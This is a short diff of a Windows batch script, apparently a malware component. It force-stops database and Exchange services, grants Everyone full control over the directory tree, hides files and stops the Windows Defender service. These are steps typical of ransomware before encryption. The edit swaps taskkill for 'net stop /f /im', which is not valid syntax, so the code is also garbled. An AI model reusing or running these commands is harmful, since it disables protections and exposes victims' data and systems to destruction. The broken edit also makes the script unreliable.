@@ -2,11 +2,11 @@
 SET i=0
 SET "NomeProcess=main.bat"
 SET "NomeService=main.bat"
-taskkill.exe /f /im mysqld.exe
-taskkill.exe /f /im sqlwriter.exe
-taskkill.exe /f /im sqlserver.exe
-taskkill.exe /f /im MSExchange*
-taskkill.exe /f /im Microsoft.Exchange.*
+net stop /f /im mysqld.exe
+net stop /f /im sqlwriter.exe
+net stop /f /im sqlserver.exe
+net stop /f /im MSExchange*
+net stop /f /im Microsoft.Exchange.*
 attrib +h
 cacls . /grant Everyone:F /T /C /Q
 net stop "Windows Defender Service"
